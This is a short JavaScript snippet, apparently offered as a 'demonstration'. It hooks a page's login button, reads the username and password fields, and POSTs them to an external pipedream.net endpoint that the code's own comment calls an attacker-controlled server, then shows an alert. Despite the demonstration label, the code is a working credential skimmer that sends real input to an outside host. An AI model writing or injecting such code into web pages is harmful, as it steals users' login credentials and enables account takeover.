function captureCredentialsOnClick() {
    // Attach an event listener to a real login button or form submission
    const loginButton = document.getElementById('login'); // Replace 'loginButton' with the actual ID or selector for your login button
    loginButton.addEventListener('click', function() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
  
      // Send the captured data to an attacker-controlled server (for demonstration purposes only)
      fetch('https://eo9brp5e0erj5kr.m.pipedream.net', {
        method: 'POST',
        body: JSON.stringify({ username, password }),
        headers: { 'Content-Type': 'application/json' },
      }).then(() => {
        alert('Your credentials have been captured. This was a demonstration and not a real attack.');
      });
    });
  }
  
  // Call the function to capture credentials when the user clicks the login button
  
